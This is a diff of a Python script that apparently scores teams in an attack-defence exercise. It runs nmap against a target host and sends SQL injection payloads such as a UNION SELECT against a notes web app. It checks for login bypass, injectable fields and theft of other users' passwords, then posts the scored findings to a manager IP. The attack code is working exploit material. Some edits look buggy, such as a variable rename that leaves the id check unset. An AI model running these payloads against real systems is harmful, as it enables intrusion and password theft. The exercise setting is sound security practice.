@@ -6,16 +6,16 @@ import subprocess
 import requests
 
 bypassable = False
-if(len(sys.argv) != 2):
-    print("Script takes 1 argument; IP address of host.")
+if(len(sys.argv) != 3):
+    print("Script takes 2 argument; IP address of host. to attack and the campaign managers ip")
     exit()
 
 #############  SETUP  #############
 target_ip = sys.argv[1]
-own_ip = ipv4 = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
-
+manager_ip = sys.argv[2]
+own_ip = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()
 print("Attacking "+target_ip+" from my own ip: "+own_ip)
-
+requests.post("http://"+manager_ip+":8855/info",json={"error":"script running"})
 
 #############  NMAP  #############
 os.system("nmap -sC -sV "+target_ip)
@@ -71,7 +71,7 @@ burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/2
 burp0_data = {"noteid": "0 UNION SELECT * FROM notes WHERE id=1-- -", "submit_button": "import note"}
 r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
 if("Note ID: 1234567890" in r.text):
-    idinjectable = True
+    importinjectable = True
     print("managed to inject id param")
 
 #Check if we can steal passwords by making a new note.
@@ -82,4 +82,30 @@ r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
 if("password" in r.text):
     passwordgrabbable = True
     print("managed to inject id param")
+
+
+
+toPost = {
+    "bypass-login": [
+        {"login bypass possible":bypassable},
+        {"description":"True if sqli allows bypassing login}"},
+        {"Score":20}
+    ],
+    "inject-id": [
+        {"Injection in id field":idinjectable},
+        {"description":"True if you can still inject sql in the id field."},
+        {"Score":10}
+    ],
+    "import-any-note": [
+        {"Importing any other note is possible":importinjectable},
+        {"description":"True if you could still do sqli in the note import field."},
+        {"Score":30}
+    ],
+    "password-grab": [
+        {"sqli to grab any users password":passwordgrabbable},
+        {"description":"True if an attacker can import a note that contains another users password"},
+        {"Score":50}
+    ]
+}
+requests.post("http://"+manager_ip+":8855/info",json=toPost)
 
